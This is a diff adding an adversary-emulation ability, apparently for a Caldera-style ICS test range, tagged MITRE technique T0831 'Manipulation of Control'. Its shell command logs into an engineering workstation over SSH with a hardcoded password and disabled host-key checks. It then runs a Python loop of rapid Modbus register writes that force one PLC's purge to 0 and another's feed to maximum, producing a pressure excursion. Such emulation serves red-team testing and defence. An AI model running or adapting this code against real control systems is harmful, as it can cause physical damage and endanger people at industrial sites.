@@ -1,0 +1,30 @@
+---
+
+- id: a9b8c7d6-1010-1010-1010-000000000004
+  name: SSH Remote Execution - Modbus Pressure Excursion from EWS
+  description: |
+    From EWS over SSH, issues rapid Modbus writes (FC6) to Purge and Feed 1 using
+    Python 3 stdlib on the workstation (no PyInstaller modbus_cli on EWS).
+  tactic: impact
+  technique_id: T0831
+  technique_name: Manipulation of Control
+  executors:
+  - platform: linux
+    name: sh
+    command: |
+      command -v sshpass >/dev/null 2>&1 || { echo "ERROR: sshpass required"; exit 1; }
+      printf '%s\n' \
+        'import socket,struct,time' \
+        'for _ in range(40):' \
+        '    s=socket.socket();s.settimeout(10);s.connect(("192.168.95.12",502))' \
+        '    pdu=struct.pack(">BHH",6,1,0)' \
+        '    s.sendall(struct.pack(">HHHB",1,0,len(pdu)+1,1)+pdu);s.recv(2048);s.close()' \
+        '    s=socket.socket();s.settimeout(10);s.connect(("192.168.95.10",502))' \
+        '    pdu=struct.pack(">BHH",6,1,65535)' \
+        '    s.sendall(struct.pack(">HHHB",1,0,len(pdu)+1,1)+pdu);s.recv(2048);s.close()' \
+        '    time.sleep(0.1)' \
+        'print("EWS_REMOTE_WRITE_IMPACT_DONE")' \
+      | sshpass -p 'plc123' ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null \
+        -o ConnectTimeout=15 engineer@192.168.95.5 'python3 -' \
+      && echo "EWS_SSH_IMPACT_WRAPPER_OK"
+    timeout: 180
